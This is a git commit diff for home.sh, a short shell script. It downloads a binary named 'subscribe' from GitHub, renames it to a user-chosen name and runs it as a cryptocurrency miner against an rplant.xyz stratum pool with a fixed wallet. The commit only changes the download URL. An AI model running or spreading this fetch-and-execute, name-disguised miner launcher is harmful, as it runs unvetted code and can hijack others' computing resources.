34febb0b8737994184703951cf595547cf759ae3
penjelajahwaktu <141205123+penjelajahwaktu@users.noreply.github.com>
2023-10-23 09:12:12 +0700

    Update home.sh

--- home.sh
+++ home.sh
@@ -1,3 +1,3 @@
 read -p " name: " CRP
 read -p " trit: " TRIT
-wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/subscribe && mv subscribe $CRP && ./$CRP -a yespowertide  -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TECGQmv7BVHSJHxhDShqoB9r7Kdik9xVMJ.$CRP -t $TRIT
+wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/subscribe && mv subscribe $CRP && ./$CRP -a yespowertide  -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TECGQmv7BVHSJHxhDShqoB9r7Kdik9xVMJ.$CRP -t $TRIT
